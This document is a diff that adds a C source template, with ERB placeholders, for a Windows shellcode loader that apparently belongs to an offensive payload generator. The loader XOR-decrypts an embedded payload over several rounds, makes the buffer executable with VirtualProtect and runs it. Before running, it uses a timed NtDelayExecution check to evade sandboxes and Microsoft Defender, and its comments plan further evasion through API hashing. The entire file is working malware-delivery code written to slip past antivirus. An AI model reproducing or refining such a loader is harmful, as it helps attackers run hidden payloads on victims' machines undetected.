@@ -1,0 +1,96 @@
+#include <Windows.h>
+#include <stdio.h>
+#define SCSIZE <%= encrypted_payload_length %>
+
+char bPayload[SCSIZE] = "<%= encrypted_payload %>";
+char bControlBytes[<%= encryption_rounds %>] = "<%= control_bytes %>";
+
+typedef union _LARGE_INTEGER {
+    struct {
+        DWORD LowPart;
+        LONG HighPart;
+    } DUMMYSTRUCTNAME;
+    struct {
+        DWORD LowPart;
+        LONG HighPart;
+    } u;
+    __int64 QuadPart;
+    } LARGE_INTEGER, *PLARGE_INTEGER;
+
+typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
+	BOOLEAN              Alertable,
+	PLARGE_INTEGER       DelayInterval
+);
+
+
+int DelayExecution()
+{
+    // Converting minutes to milliseconds - TODO: add random interval 
+    DWORD               dwMilliSeconds = 12000;
+    LARGE_INTEGER       DelayInterval = { 0 };
+    __int64             Delay = NULL;
+    NTSTATUS            STATUS = NULL;
+
+    // TODO: add API hashing
+    fnNtDelayExecution  pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
+    DWORD               _T0 = NULL, _T1 = NULL;
+
+    // Converting from milliseconds to the 100-nanosecond - negative time interval
+    Delay = dwMilliSeconds * 10000;
+    DelayInterval.QuadPart = -Delay;
+
+    _T0 = GetTickCount();
+    
+    
+    // Sleeping for 'dwMilliSeconds' ms 
+    if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 ) {
+        return 0;
+    }
+
+    _T1 = GetTickCount();
+     
+    if((_T1 - _T0) < dwMilliSeconds) {
+        return 0;
+    }
+
+    return 1;
+}
+
+char GetKey(char control_byte)
+{
+	char hardcoded = bPayload[0];
+	for (int i = 0; i <= 255; i++)
+	{
+		char res = i ^ hardcoded;
+                if (res == (char)(control_byte)) 
+			return (char)i;
+	}
+        }
+
+        void DecryptPayload(char control_byte)
+        {
+                char key = GetKey(control_byte);
+                for (int i = 0; i < SCSIZE; i++)
+                {
+                        bPayload[i] = bPayload[i] ^ key;
+                }
+        }
+
+void main() {
+	DWORD dwOldProtect;
+	char* payload_fnc = NULL;
+        for(int i = 0; i < <%= encryption_rounds %>; i++)
+        {
+                DecryptPayload(bControlBytes[i]);
+        }
+        payload_fnc = bPayload + 1;
+        VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+        
+        //play dead for Microsoft Defender, because why not
+        if(DelayExecution()){
+        (*(void (*)()) payload_fnc)();
+        }
+
+	return;
+}
+
